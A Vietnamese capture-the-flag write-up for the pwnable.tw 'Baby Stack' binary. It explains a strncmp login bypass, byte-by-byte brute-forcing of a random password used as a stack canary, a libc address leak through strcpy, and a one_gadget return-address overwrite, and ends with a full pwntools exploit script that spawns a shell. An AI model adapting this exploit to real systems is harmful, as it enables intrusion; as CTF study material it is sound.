# Challenge: Baby Stack

## Vấn đề
- [File challenge](https://github.com/haiwh07/CTFWriteUp/blob/main/pwnable/BabyStack/babystack)
- Chương trình thực thi như sau (đã được tôi dịch cho dễ hiểu):
```
__int64 __fastcall main(__int64 a1, char **a2, char **a3)
{
  _QWORD *v3; // rcx
  __int64 v4; // rdx
  char v6[64]; // [rsp+0h] [rbp-60h] BYREF
  __int64 buf[2]; // [rsp+40h] [rbp-20h] BYREF
  char v8[16]; // [rsp+50h] [rbp-10h] BYREF

  sub_D30();
  password_create = open("/dev/urandom", 0);
  read(password_create, buf, 0x10uLL);
  v3 = password;
  v4 = buf[1];
  *(_QWORD *)password = buf[0];
  v3[1] = v4;
  close(password_create);
  while ( 1 )
  {
    write(1, ">> ", 3uLL);
    _read_chk(0LL, (__int64)v8, 16LL, 16LL);
    if ( v8[0] == '2' )
      break;
    if ( v8[0] == '3' )
    {
      if ( login_success )
        copy(v6);
      else
LABEL_13:
        puts("Invalid choice");
    }
    else
    {
      if ( v8[0] != '1' )
        goto LABEL_13;
      if ( login_success )
        login_success = 0;
      else
        login((const char *)buf);
    }
  }
  if ( !login_success )
    exit(0);
  memcmp(buf, password, 16uLL);
  return 0LL;
}
```
- Chương trình, gồm 3 hàm thực thi theo thứ tự input sau:
```
int __fastcall login(const char *buf)
{
  size_t size; // rax
  char s[128]; // [rsp+10h] [rbp-80h] BYREF

  printf("Your passowrd :");
  check_pass(s, 127LL);
  size = strlen(s);
  if ( strncmp(s, buf, size) )
    return puts("Failed !");
  login_success = 1;
  return puts("Login Success !");
}

if ( v8[0] == '2' )
  break;

int __fastcall copy(char *a1)
{
  char src[128]; // [rsp+10h] [rbp-80h] BYREF

  printf("Copy :");
  check_pass((unsigned __int8 *)src, 63u);
  strcpy(a1, src);
  return puts("It is magic copy !");
}
```
- Checksec:
```
+ Arch:       amd64-64-little
+ RELRO:      Full RELRO
+ Stack:      Canary found
+ NX:         NX enabled
+ PIE:        PIE enabled
+ FORTIFY:    Enable
```

## Giải pháp
- Khi checksec, tôi thấy rằng chall này bật full các lớp bảo mật do đó, tôi sẽ chạy chương trình thử xem có thể khai thác ở đâu.
- Nói sơ qua cách thức hoạt động của từng hàm thì khi nhập '1' chương trình sẽ cho user nhập password nếu trùng với password mà _password_create = open("/dev/urandom", 0);_ tạo thì sẽ Login Success.
- Tiếp theo, khi nhập '2' chúng ta sẽ ngưng vòng lặp menu() và nếu trước đó Login Success thì chương trình sẽ chạy memcmp(...) check xem canary có trùng ko rồi mới ret. Nếu trước đó Login Failed thì sẽ chạy exit() lập tức.
- Cuối cùng, khi nhập '3' chúng ta có thể input() dữ liệu vào với độ dài 63 bytes và sau đó sẽ được buf copy thẳng vào buf.
> Nếu muốn khai thác thì phải Login Success.
- Vì chương trình sau khi chạy hàm login() mà Failed nó không kết thúc mà nó vẫn chạy trong while do đó ta có thể lặp đi lặp lại quá trình login. Xem qua hàm login() tôi thấy rằng việc đọc password thông qua _strncmp(s, buf, size)_, vấn đề ở đây là nếu như size là 0 thì strncmp(s, buf, 0) sẽ lấy s và buf so sánh với nhau nhưng chỉ với size = 0, nghĩa là trong lúc đọc s và buf hàm read(0, buf, 0) chạy ret ngay lập tức vì nó đâu có size nào để nó đọc buf lúc này sẽ là b'\x00', và s của chúng ta cũng là b'\x00' nên hàm strncmp() lúc này bị đánh lừa và hàm login() chạy thành công.
```
└─$ ./babystack_patched
>> 1
Your passowrd :
Login Success !
>>
```
- Đây là hàm check_pass() để lưu dữ liệu vào s:
```
unsigned __int8 *__fastcall check_pass(unsigned __int8 *src, unsigned int size)
{
  unsigned __int8 *result; // rax
  int v3; // [rsp+1Ch] [rbp-4h]

  v3 = read(0, src, size);
  if ( v3 <= 0 )
  {
    puts("read error");
    exit(1);
  }
  result = (unsigned __int8 *)src[v3 - 1];
  if ( (_BYTE)result == 10 )
  {
    result = &src[v3 - 1];
    *result = 0;
  }
  return result;
}
```
- Từ đó, có thể dùng **brute-force** để dò tìm password bằng phương pháp **byte by byte**. Tức là dò từng byte và gửi vào login() nếu byte đó trùng với password và kèm theo b'\x00' ở cuối thành công thì sẽ được lưu vào biến password_success.
> Sau khi brute-force, ta leak được password đã được chương trình random.
- Nhưng vấn đề là chall mở full lớp bảo mật nên ta hướng đến dùng oneshot vậy nên ta cần leak libc. Trong buf có libc ngay phía sau canary (tức là ngay sau password).
> Overwrite bytes NULL trong buf và leak libc. Và dùng oneshot để lấy shell.

## Quá trình
- Trước tiên, để leak password_success ta cần tạo hàm brute_force trong script.
```
def brute_force(s, maximum_len):
    while len(s) < maximum_len:
        byte_found = False

        for i in range(1, 256):
            print(f"testing {i} out of 255\n", end='\r')
            test_bytes = bytes([i])
            password = s + test_bytes
            sl(b'1')
            sla(b'passowrd :', password)

            try:
                response = p.recvuntil(b'>> ', timeout=5) 
                if b'Login Success !' in response:
                    s += test_bytes
                    print(f"[+] Tim thay byte tiep theo: {test_bytes} (Hex: {hex(i)}) | String hien tai: {s} | Len: {len(s)}")
                    byte_found = True
                    sl(b'1')
                    break 
                    
                elif b'Failed !' in response:
                    continue

                else:
                    break

            except Exception as e:
                pass

        if not byte_found:
            print("[-] Khong tim thay byte hop le tiep theo. Dung thuat toan.")
            break

    return s
```
> Leak được password_success.
- Check qua buf khi đang chạy hàm login() tôi thấy rằng, khi chạy login lệnh check_pass() chỉ đọc tới byte NULL (tức là b'\x00') và hàm read() lúc này vẫn đọc tiếp các bytes sau nếu như chưa sendline(), từ đó tôi có thể gửi byte đầu tiên là b'\x00' để đánh lừa check_pass() rằng password tôi nhập chỉ tới đây nhưng sau đó tôi kèm thêm các bytes rác để overwrite buf để xóa đi các NULL bytes trong buf stack.
```
login(b'\x00' + b'A'*63 + b'C'*8)
```
- Lúc này password đã bị thay thế thành b'C'*8 và tiếp theo ta cần thay đổi lại buf hiện tại thành buf stack ta đã overwrite các NULL bytes. Và hàm copy() sẽ thực hiện điều đó vì lệnh _strcpy(a1, src);_ trong hàm copy() sẽ lấy 63 bytes dữ liệu input của user kèm thèm các bytes trong buf stack. Ta chỉ cần nhập full 63 bytes trong hàm copy() thì chương trình sẽ lấy các bytes trong buf stack truyền qua buf hiện tại và thê là ta overwrite luôn password dẫn tới lúc này có thể leak libc.
- Vẫn tiếp tục dùng brute-force để leak 6 bytes libc của buf. Vì trong buf hiện tại password đã bị thay đổi thành b'C'*8 nên ta truyền thẳng 8 bytes vào trước để chạy brute-force nhanh hơn.
```
libc_leak = brute_force(b'CCCCCCCC', 14)
```
> Leak libc và tính libc base.
- Khi có được libc base rồi, check qua one gadget như sau:
```
└─$ one_gadget libc_64.so.6
0x4526a execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL || {[rsp+0x30], [rsp+0x38], [rsp+0x40], [rsp+0x48], ...} is a valid argv

0xef6c4 execve("/bin/sh", rsp+0x50, environ)
constraints:
  [rsp+0x50] == NULL || {[rsp+0x50], [rsp+0x58], [rsp+0x60], [rsp+0x68], ...} is a valid argv

0xf0567 execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL || {[rsp+0x70], [rsp+0x78], [rsp+0x80], [rsp+0x88], ...} is a valid argv
```
- Lúc này để có được shell ta cần overwrite ret address thành oneshot và cùng với trả lại canary (16 bytes password_success) để khi chạy memcmp() ta không bị báo SIGABRT(). Xem qua debug để tính offset tới canary + ret addr và đẩy vào login(). Và dùng hàm exit() để thoát while lúc Login Success để nó chạy tới ret addr là ta sẽ có được shell.

## Script
- Vì server pwnable gửi data chậm nên tôi đã thêm các lệnh sleep() ngay sau những lần gửi để không bị thất thoát data. Cùng với đó, do password là random nên sẽ có những lần random ra NULL bytes trong pass dẫn đến brute-force không dò được.
> Chạy nhiều lần để tăng tỉ lệ thành công. Do đó tôi đã thêm while để chạy vòng lặp vô hạn.
```
#!/usr/bin/env python3

from pwn import *

exe = ELF('babystack_patched', checksec=False)
libc = ELF('libc_64.so.6', checksec=False)
context.binary = exe

info = lambda msg: log.info(msg)
s = lambda data, proc=None: proc.send(data) if proc else p.send(data)
sa = lambda msg, data, proc=None: proc.sendafter(msg, data) if proc else p.sendafter(msg, data)
sl = lambda data, proc=None: proc.sendline(data) if proc else p.sendline(data)
sla = lambda msg, data, proc=None: proc.sendlineafter(msg, data) if proc else p.sendlineafter(msg, data)
sn = lambda num, proc=None: proc.send(str(num).encode()) if proc else p.send(str(num).encode())
sna = lambda msg, num, proc=None: proc.sendafter(msg, str(num).encode()) if proc else p.sendafter(msg, str(num).encode())
sln = lambda num, proc=None: proc.sendline(str(num).encode()) if proc else p.sendline(str(num).encode())
slna = lambda msg, num, proc=None: proc.sendlineafter(msg, str(num).encode()) if proc else p.sendlineafter(msg, str(num).encode())
def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
        

        
        ''')
        input()


# if args.REMOTE:
#     p = remote('chall.pwnable.tw', 10205)
# else:
#     p = process([exe.path])

def login(password):
    slna(b'>> ', 1)
    sa(b'passowrd :', password)

def exit():
    slna(b'>> ', 2)

def copy(data):
    slna(b'>> ', 3)
    sa(b'Copy :', data)

def brute_force(s, maximum_len):
    while len(s) < maximum_len:
        byte_found = False

        for i in range(1, 256):
            print(f"testing {i} out of 255\n", end='\r')
            test_bytes = bytes([i])
            password = s + test_bytes
            sl(b'1')
            sla(b'passowrd :', password)

            try:
                response = p.recvuntil(b'>> ', timeout=5) 
                if b'Login Success !' in response:
                    s += test_bytes
                    print(f"[+] Tim thay byte tiep theo: {test_bytes} (Hex: {hex(i)}) | String hien tai: {s} | Len: {len(s)}")
                    byte_found = True
                    sl(b'1')
                    break 
                    
                elif b'Failed !' in response:
                    continue

                else:
                    break

            except Exception as e:
                pass

        if not byte_found:
            print("[-] Khong tim thay byte hop le tiep theo. Dung thuat toan.")
            break

    return s

while True:

    try:

        if args.REMOTE:
            p = remote('chall.pwnable.tw', 10205)
        else:
            p = process([exe.path])

        ##############################
        ### STAGE 1: Leak password ###
        ##############################
        password_success = brute_force(b'', 16)
        print(f"\n[*] Ket qua cuoi cung: {password_success}")
        password_success_8 = password_success[0:8]
        password_success_16 = password_success[8:16]
        info("Password success (0:8): " + hex(u64(password_success_8)))
        info("password success (8:16): " + hex(u64(password_success_16)))
        login(b'\x00' + b'A'*63 + b'C'*8)
        sleep(5)
        payload = flat(
            b'A'*63,
            b'B'*16,
            )
        copy(payload)
        sleep(5)
        sla(b'>> ', b'AAAA')
        p.recvuntil(b'>> Invalid choice', drop=True)
        slna(b'>> ', 1)
        sleep(5)

        ##########################
        ### STAGE 2: Leak libc ###
        ##########################
        libc_leak = brute_force(b'CCCCCCCC', 14)
        print(f"\n[*] Ket qua cuoi cung: {libc_leak}")
        libc_leak = u64(libc_leak[8:16].ljust(8, b'\x00'))
        libc.address = libc_leak - 0x78439
        info("Libc leak: " + hex(libc_leak))
        info("Libc base: " + hex(libc.address))

        ########################
        ### STAGE 3: Oneshot ###
        ########################
        oneshot = [0x4526a, 0xef6c4, 0xf0567]
        sleep(5)
        sln(1)
        payload1 = flat(
            b'\x00',
            b'A'*63,
            u64(password_success_8),
            u64(password_success_16),
            b'B'*24,
            p64(libc.address + oneshot[2]),
            )
        sleep(5)
        sla(b'passowrd :', payload1)
        sleep(5)
        copy(b'A'*0x3f)
        sleep(5)
        exit()

        p.interactive()

        break

    except Exception as e:
        print(f"\n[-] Script stopped: {e}")
        print("[*] Restarting...\n")

        try:
            p.close()
        except:
            pass

        sleep(5)
```
